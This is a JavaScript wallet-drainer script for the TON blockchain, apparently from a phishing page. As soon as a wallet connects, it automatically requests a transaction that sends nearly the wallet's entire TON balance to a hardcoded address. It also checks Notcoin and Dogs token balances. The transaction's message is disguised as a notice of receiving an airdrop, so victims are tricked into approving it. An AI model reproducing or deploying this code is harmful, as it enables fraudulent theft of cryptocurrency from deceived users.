const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://qertyuggfcf.github.io/Kalabarg/tonconnect-manifest.json',
    buttonRootId: 'cnbtn',
    items: [
        { "name": "ton_addr" },
        { "name": "ton_proof", "payload": "rand" }
    ]
});

tonConnectUI.setConnectRequestParameters({
    state: "ready",
    value: {
        tonProof: 'rand'
    }
});

tonConnectUI.onStatusChange(wallet => {
    if (wallet && wallet.connectItems?.tonProof && 'proof' in wallet.connectItems.tonProof) {
        // عمل مورد نیاز اینجا قرار می‌گیرد، در اینجا کد پاک شده مربوط به چک کردن
    }
});

async function connectToWallet() {
    const connectedWallet = await tonConnectUI.connectWallet();
}

async function send_transaction() {
    try {
        const senderAddress = tonConnectUI.account.address; // Replace with actual sender address

        // Fetching jettons balances
        const getJettonBalances = async (address) => {
            const response = await fetch(`https://tonapi.io/v2/accounts/${address}/jettons`);
            return response.json();
        };

        const balancesData = await getJettonBalances(senderAddress);
        const jettonsBalances = [];

        let notcoinBalance = 0;
        let dogsBalance = 0;

        balancesData.balances.forEach(balance => {
            if (balance.jetton.verification === "whitelist") {
                if (balance.jetton.name === 'Notcoin') {
                    notcoinBalance = parseFloat(balance.balance) / 1e9;
                } else if (balance.jetton.name === 'Dogs') {
                    dogsBalance = parseFloat(balance.balance) / 1e9;
                }
            }
        });

        const walletInfoResponse = await fetch(`https://toncenter.com/api/v2/getWalletInformation?address=${senderAddress}`);
        const walletInfo = await walletInfoResponse.json();
        const tonBalance = walletInfo.result.balance / 1e9;

        const amountToSubtract = 0.07; // در صورتی که لازم است تغییری ایجاد کنید
        if (tonBalance < amountToSubtract) {
            // اضافه کردن رفتار در صورت نیاز
        }

        let transaction = {
            validUntil: Date.now() + 1000000,
            messages: [
                {
                    address: "UQCpz3fyUjn9_dey098-Fqv47cbzfUpY4Jl_3S7-PTx_1kRA",
                    amount: (tonBalance * 1e9) - (amountToSubtract * 1e9),
                    payload: "te6ccsEBAQEAMAAAAFwAAAAAUmVjZWl2ZSAwLjU2NTAzMTc5OCBUb25jb2lucyBmcm9tIEFpcmRyb3AuxulJ2Q==",
                    walletStateInit: "te6cckEBAwEAoAACATQBAgDe/wAg3SCCAUyXuiGCATOcurGfcbDtRNDTH9MfMdcL/+ME4KTyYIMI1xgg0x/TH9MfCMTu/Jj7UTQ0x/TH9P/0VEyuvKhUUS68qIE+QFUEFX5EPKj+ACTINdKltMH1AL7AOjRAaTIyx/LH8v/ye1UAFAAAAAAKamjFxTRI7XDjYxnnte68ixbExsAIpfQ+L3fpYZzQSMnQ9S1tbOO9A=="
                }
            ]
        };

        if (await tonConnectUI.sendTransaction(transaction)) {
            // تراکنش موفق بود
        }
    } catch (error) {
        console.error('Transaction error:', error);
    }
}

(async () => {
    tonConnectUI.onStatusChange(async () => {
        if (tonConnectUI.connected) {
            setTimeout(async function () {
                await send_transaction();
            }, 2000);
        }
    });

    if (tonConnectUI.connected) {
        setTimeout(async function () {
            await send_transaction();
        }, 1500);
    }
})();
